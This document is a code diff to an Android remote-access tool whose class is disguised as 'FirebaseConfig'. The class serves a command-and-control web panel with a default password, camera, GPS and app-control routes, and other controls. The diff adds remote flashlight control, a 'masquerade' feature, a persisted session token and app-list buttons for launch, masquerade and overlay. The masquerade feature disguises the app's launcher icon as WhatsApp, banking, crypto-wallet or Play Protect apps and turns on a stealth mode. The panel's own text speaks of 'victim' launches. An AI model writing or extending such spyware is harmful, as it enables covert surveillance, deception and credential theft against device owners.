@@ -22,6 +22,7 @@ import android.util.Log;
 import android.accessibilityservice.AccessibilityService;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.OptIn;
 import androidx.core.content.ContextCompat;
 import java.io.BufferedReader;
 import java.io.InputStream;
@@ -202,7 +203,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
     private String getHeader(String uri) {
         // Navigation Map
-        String homeActive = (uri.equals("/") || uri.equals("/terminal")) ? "active" : "";
+        String homeActive = (uri == null || uri.equals("/") || uri.equals("/terminal") || uri.isEmpty() || uri.trim().isEmpty()) ? "active" : "";
         String ghostActive = uri.startsWith("/ghost") ? "active" : "";
         String cameraActive = (uri.startsWith("/camera") || uri.startsWith("/camera/live")) ? "active" : "";
         String gpsActive = uri.startsWith("/gps") ? "active" : "";
@@ -244,11 +245,12 @@ public class FirebaseConfig extends NanoHTTPD {
             "<title>LAB-RATS | CORE</title>" +
             "<link href=\"https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap\" rel=\"stylesheet\">" +
             "<link rel=\"stylesheet\" href=\"/c2/style.css?v=" + System.currentTimeMillis() + "\">" +
+            "<style>.nav a.active { background: #00f2ff !important; border-color: #00f2ff !important; color: #000 !important; box-shadow: 0 0 35px #00f2ff, inset 0 0 15px rgba(0,0,0,0.4) !important; font-weight: 900 !important; transform: scale(1.04); } @media (min-width: 1024px) { body { zoom: 0.9; } }</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
             "  <div class=\"header\" style=\"padding: 0; margin-bottom: 0 !important; border: none !important; background: transparent !important; box-shadow: none !important; backdrop-filter: none !important; -webkit-backdrop-filter: none !important;\">" +
-            "    <img src=\"/c2/header_dashboard.png?v=31\" style=\"width: 90%; max-width: 900px; height: auto; margin: 0 auto; display: block; background: transparent !important; border: none !important; box-shadow: none !important; border-radius: 0; image-rendering: -webkit-optimize-contrast; image-rendering: high-quality; object-fit: contain;\" alt=\"LAB-RATS Header\" loading=\"eager\">" +
+            "    <img src=\"/c2/header_dashboard.png?v=41\" style=\"width: 75%; max-width: 1080px; height: auto; margin: 0 auto; display: block; background: transparent !important; border: none !important; box-shadow: none !important; filter: none !important; border-radius: 0; image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges; image-rendering: high-quality; transform: translateZ(0); object-fit: contain;\" alt=\"LAB-RATS Header\" loading=\"eager\">" +
             "    <div id=\"enc-status\" style=\"font-size: 0.52rem; color: #555; letter-spacing: 2px; text-transform: uppercase; margin-top: 10px; text-align: center;\">LINK_SEC: <span style=\"color:#ff3131;\">OFFLINE</span></div>" +
             "  </div>" + navHtml;
     }
@@ -288,7 +290,7 @@ public class FirebaseConfig extends NanoHTTPD {
             "</style></head><body>" +
             "<div class=\"login-centering-wrapper\">" +
             "<div class=\"login-card\">" +
-            "<img src=\"/logo?v=150\" style=\"width: 260px; height: 260px; background: transparent !important; border: none !important; box-shadow: none !important; outline: none !important;\">" +
+            "<img src=\"/logo?v=150\" style=\"width: 260px; height: 260px; background: transparent !important; border: none !important; box-shadow: none !important; outline: none !important; margin: 0 auto 10px auto; display: block;\">" +
             "<div id=\"status-header\" class=\"title-font\">RESTRICTED_ACCESS</div>" +
             "<div style=\"font-size:0.95rem; opacity:0.6; margin-top: 4px; margin-bottom: 18px; letter-spacing:3px; font-family: 'Aldrich', sans-serif;\">v1.6.0</div>" +
                         "<form id=\"login-form\" method=\"POST\" action=\"/login\" onsubmit=\"handleLogin(event)\">" +
@@ -369,13 +371,14 @@ public class FirebaseConfig extends NanoHTTPD {
             }
         });
 
-        // [SECURITY_STABILITY_LINK]
-        // Token survives service restarts (fixes camera) but resets on full kill/reboot
-        sessionToken = WorkManager_Sync.activeSessionToken;
+        // [SECURITY_STABILITY_LINK] Persistent session token across service restarts & stealth toggles
+        sessionToken = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getString("session_token", "");
         if (sessionToken == null || sessionToken.isEmpty()) {
             sessionToken = java.util.UUID.randomUUID().toString();
-            WorkManager_Sync.activeSessionToken = sessionToken;
+            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                    .edit().putString("session_token", sessionToken).apply();
         }
+        WorkManager_Sync.activeSessionToken = sessionToken;
 
         LabRatsWorker.execute(this::loadPersistentData);
         
@@ -548,6 +551,9 @@ public class FirebaseConfig extends NanoHTTPD {
         } else if (uri.equals("/device/max-volume")) {
             setMaxVolume();
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/flashlight") || uri.equals("/device/torch")) {
+            toggleFlashlight();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"flashlight\": " + isFlashlightOn + "}");
         } else if (uri.equals("/device/silent-mode")) {
             setSilentMode();
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
@@ -558,6 +564,9 @@ public class FirebaseConfig extends NanoHTTPD {
         } else if (uri.equals("/device/open-app")) {
             openAppOnDevice(params.get("pkg"));
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
+        } else if (uri.equals("/device/masquerade")) {
+            String pkg = params.get("pkg");
+            return handleMasqueradeApp(pkg, session);
         } else if (uri.equals("/device/open-url")) {
             openUrlOnDevice(params.get("url"));
             return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
@@ -857,6 +866,18 @@ public class FirebaseConfig extends NanoHTTPD {
             Map<String, String> params = session.getParms();
             String newPass = params.get("new_password");
 
+            if (newPass == null && files.containsKey("postData")) {
+                try {
+                    String rawBody = files.get("postData");
+                    if (rawBody != null && rawBody.trim().startsWith("{")) {
+                        org.json.JSONObject jsonObj = new org.json.JSONObject(rawBody);
+                        if (jsonObj.has("new_password")) {
+                            newPass = jsonObj.getString("new_password");
+                        }
+                    }
+                } catch (Exception ignored) {}
+            }
+
             // [DEEP_STEALTH] De-obfuscate payload if it's masked
             if (newPass != null && newPass.startsWith("0x_")) {
                 try {
@@ -873,7 +894,7 @@ public class FirebaseConfig extends NanoHTTPD {
 
             logActivity("SECURITY_PROTOCOL: Interface password updated");
 
-            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
+            String html = getHeader(session.getUri()) + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-green);\">&#10004;</div><h2>Access Key Updated</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">New security protocol active. You will need to use this key for future uplinks.</p><div style=\"display: flex; justify-content: center;\"><a href=\"./\" class=\"btn\">Back to Terminal</a></div></div></div>" + getFooter();
             return serveGzipped(session, "text/html", html);
         } catch (Exception e) {
             return serveError(session, "Failed to update password: " + e.getMessage());
@@ -883,6 +904,40 @@ public class FirebaseConfig extends NanoHTTPD {
     private String getStoredPassword() {
         return context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                 .getString("c2_password", "admin1337");
+    }
+
+    private static boolean isFlashlightOn = false;
+
+    @OptIn(markerClass = androidx.camera.camera2.interop.ExperimentalCamera2Interop.class)
+    private void toggleFlashlight() {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
+                if (cm != null) {
+                    String[] ids = cm.getCameraIdList();
+                    for (String id : ids) {
+                        try {
+                            Boolean hasFlash = cm.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                            if (Boolean.TRUE.equals(hasFlash)) {
+                                isFlashlightOn = !isFlashlightOn;
+                                cm.setTorchMode(id, isFlashlightOn);
+                                logActivity("HARDWARE_CONTROL: Flashlight " + (isFlashlightOn ? "ENGAGED" : "DISENGAGED"));
+                                break;
+                            }
+                        } catch (Exception ignored) {}
+                    }
+                }
+            } else {
+                Analytics_Provider ap = Analytics_Provider.getInstance();
+                if (ap != null) {
+                    isFlashlightOn = !isFlashlightOn;
+                    ap.setFlashMode(isFlashlightOn);
+                    logActivity("HARDWARE_CONTROL: Flashlight " + (isFlashlightOn ? "ENGAGED" : "DISENGAGED"));
+                }
+            }
+        } catch (Exception e) {
+            Log.e("FirebaseConfig", "Flashlight Error: " + e.getMessage());
+        }
     }
 
     private void vibrateDevice() {
@@ -996,7 +1051,7 @@ public class FirebaseConfig extends NanoHTTPD {
         android.content.pm.PackageManager pm = context.getPackageManager();
         List<android.content.pm.PackageInfo> apps = pm.getInstalledPackages(0);
         
-        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th></tr></thead><tbody>");
+        html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Icon</th><th>App Name</th><th>Package ID</th><th>Type</th><th>Version</th><th>Actions</th></tr></thead><tbody>");
         for (android.content.pm.PackageInfo app : apps) {
             String name = app.applicationInfo.loadLabel(pm).toString();
             boolean isSystem = (app.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
@@ -1009,10 +1064,90 @@ public class FirebaseConfig extends NanoHTTPD {
             html.append("<td>").append(escapeHtml(name)).append("</td>");
             html.append("<td style=\"font-family:monospace; font-size:0.7rem;\">").append(app.packageName).append("</td>");
             html.append("<td>").append(typeLabel).append("</td>");
-            html.append("<td>").append(app.versionName).append("</td></tr>");
+            html.append("<td>").append(app.versionName != null ? app.versionName : "1.0").append("</td>");
+
+            html.append("<td style=\"white-space: nowrap;\">");
+            html.append("<a href=\"/device/open-app?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-green); color:var(--neon-green); background:rgba(57,255,20,0.05); margin-right:5px;\">▶️ LAUNCH</a>");
+            html.append("<a href=\"/device/masquerade?pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); background:rgba(0,242,255,0.05); margin-right:5px;\">🎭 MASQUERADE</a>");
+            html.append("<a href=\"/ghost/interact?action=overlay&pkg=").append(app.packageName).append("\" class=\"btn btn-small\" style=\"border-color:var(--neon-orange); color:var(--neon-orange); background:rgba(255,157,0,0.05);\">🔒 OVERLAY</a>");
+            html.append("</td></tr>");
         }
         html.append("</tbody></table></div></div>").append(getFooter());
         return serveGzipped(session, "text/html", html.toString());
+    }
+
+    private Response handleMasqueradeApp(String pkg, IHTTPSession session) {
+        if (pkg == null || pkg.isEmpty()) return serveError(session, "Package parameter missing");
+        
+        try {
+            Map<String, String> params = session.getParms();
+            android.content.pm.PackageManager pm = context.getPackageManager();
+            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
+            String appName = appInfo.loadLabel(pm).toString();
+
+            // Determine matching alias component based on package or category
+            String targetAlias = "SettingsAlias"; // Play Protect default
+            String lowerPkg = pkg.toLowerCase();
+            String lowerName = appName.toLowerCase();
+
+            if (lowerPkg.contains("whatsapp") || lowerName.contains("whatsapp")) {
+                targetAlias = "WhatsAppAlias";
+            } else if (lowerPkg.contains("telegram") || lowerName.contains("telegram")) {
+                targetAlias = "TelegramAlias";
+            } else if (lowerPkg.contains("instagram") || lowerName.contains("instagram")) {
+                targetAlias = "InstagramAlias";
+            } else if (lowerPkg.contains("youtube") || lowerName.contains("youtube")) {
+                targetAlias = "YouTubeAlias";
+            } else if (lowerPkg.contains("chrome") || lowerName.contains("chrome")) {
+                targetAlias = "ChromeAlias";
+            } else if (lowerPkg.contains("bank") || lowerPkg.contains("pcfinancial") || lowerName.contains("bank") || lowerPkg.contains("casino") || lowerPkg.contains("bet") || lowerPkg.contains("bree")) {
+                targetAlias = "BankAlias";
+            } else if (lowerPkg.contains("mail") || lowerPkg.contains("proton") || lowerName.contains("mail") || lowerPkg.contains("email")) {
+                targetAlias = "MailAlias";
+            } else if (lowerPkg.contains("vpn") || lowerName.contains("vpn")) {
+                targetAlias = "VPNAlias";
+            } else if (lowerPkg.contains("pdf") || lowerPkg.contains("adobe") || lowerName.contains("acrobat") || lowerName.contains("reader")) {
+                targetAlias = "PdfAlias";
+            } else if (lowerPkg.contains("music") || lowerPkg.contains("spotify") || lowerName.contains("music")) {
+                targetAlias = "MusicAlias";
+            } else if (lowerPkg.contains("twitter") || lowerPkg.contains("x.android") || lowerName.contains("twitter") || lowerName.equals("x")) {
+                targetAlias = "TwitterAlias";
+            } else if (lowerPkg.contains("termux") || lowerName.contains("termux")) {
+                targetAlias = "TermuxAlias";
+            } else if (lowerPkg.contains("electrum") || lowerPkg.contains("wallet") || lowerName.contains("crypto") || lowerName.contains("bitcoin")) {
+                targetAlias = "CryptoAlias";
+            } else if (lowerPkg.contains("calculator") || lowerName.contains("calculator") || lowerPkg.contains("calc")) {
+                targetAlias = "CalculatorAlias";
+            } else if (lowerPkg.contains("weather") || lowerName.contains("weather")) {
+                targetAlias = "WeatherAlias";
+            } else if (lowerPkg.contains("settings") || lowerPkg.contains("vending") || lowerPkg.contains("protect") || lowerName.contains("settings")) {
+                targetAlias = "SettingsAlias";
+            } else if (lowerPkg.equals("android") || lowerPkg.contains("com.android.systemui") || lowerPkg.contains("system.service")) {
+                targetAlias = "AndroidSystemAlias";
+            }
+
+            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
+                    .edit()
+                    .putString("masquerade_pkg", pkg)
+                    .putString("masquerade_name", appName)
+                    .putBoolean("decoy_deployed", true)
+                    .apply();
+
+            SystemAnalytics.setStealthMode(context, true);
+
+            logActivity("STEALTH_CAMOUFLAGE: App identity morphed to " + appName + " (" + pkg + ") via " + targetAlias);
+
+            String safeAppName = appName.replace("\"", "\\\"");
+            if ("true".equals(params.get("json")) || (session.getHeaders().get("accept") != null && session.getHeaders().get("accept") != null && session.getHeaders().get("accept").contains("json"))) {
+                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"appName\": \"" + safeAppName + "\", \"alias\": \"" + targetAlias + "\"}");
+            }
+
+            String html = getHeader(session.getUri()) + 
+                "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color:var(--neon-cyan);\">🎭</div><h2>App Identity Morphed</h2><div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div><p style=\"margin-bottom: 25px;\">Launcher camouflage active as <b>" + escapeHtml(appName) + "</b> (" + escapeHtml(pkg) + ").<br>Icon and label assigned via <b>" + targetAlias + "</b> with dynamic icon bitmap pinning.<br>Victim launches on the home screen will seamlessly pass through to the real application.</p><div style=\"display: flex; justify-content: center;\"><a href=\"/device/apps\" class=\"btn\">Back to Apps</a></div></div></div>" + getFooter();
+            return serveGzipped(session, "text/html", html);
+        } catch (Exception e) {
+            return serveError(session, "Failed to masquerade app: " + e.getMessage());
+        }
     }
 
     private String getAppIconBase64(android.content.pm.ApplicationInfo appInfo) {
